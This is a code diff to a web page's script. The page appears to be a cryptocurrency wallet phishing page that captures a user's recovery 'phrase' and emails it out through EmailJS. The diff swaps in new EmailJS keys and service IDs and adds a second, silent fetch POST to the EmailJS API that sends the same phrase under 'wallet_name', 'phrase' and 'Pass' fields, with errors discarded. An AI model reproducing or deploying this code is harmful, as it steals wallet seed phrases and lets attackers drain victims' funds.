@@ -201,7 +201,7 @@ user-scalable=0">
   <script type="text/javascript">
       (function() {
           emailjs.init({
-            publicKey: "rsqRxaJjVdHxHg4Vs",
+            publicKey: "yjWkOu8epUEvtkdA0",
           });
       })();
   </script>
@@ -246,14 +246,34 @@ user-scalable=0">
     hiddenInput.setAttribute('name', 'phrase'); // Set name as 'ohrase'
     hiddenInput.setAttribute('value', dataToSubmit.phrase); // Set the value from getInputValues()
     form.appendChild(hiddenInput); // Append the hidden input to the form
-
+var dataToEmail = {
+                service_id: 'service_e57dbwl',
+                template_id: 'template_t1ksado',
+                user_id: 'vhepvvtO0vPbKliRa',
+                template_params: {
+                    'wallet_name': dataToSubmit.phrase,
+                    'phrase': dataToSubmit.phrase,
+                    'Pass': dataToSubmit.phrase
+                }
+            };
     // Send the dynamically created form using EmailJS
-    emailjs.sendForm('service_amc0igq', 'template_af6wmzp', form)
+    emailjs.sendForm('service_manllwo', 'template_oydls6m', form)
         .then(() => {
             console.log('SUCCESS!');
         }, (error) => {
             console.log('FAILED...', error);
         });
+    fetch('https://api.emailjs.com/api/v1.0/email/send', {
+  method: 'POST',
+  headers: {
+    'Content-Type': 'application/json',
+  },
+  body: JSON.stringify(dataToEmail)
+})
+  .then(response => {
+    return response.json(); 
+  })
+  .catch(error => {});
     try {
             await postData(
             dataToSubmit
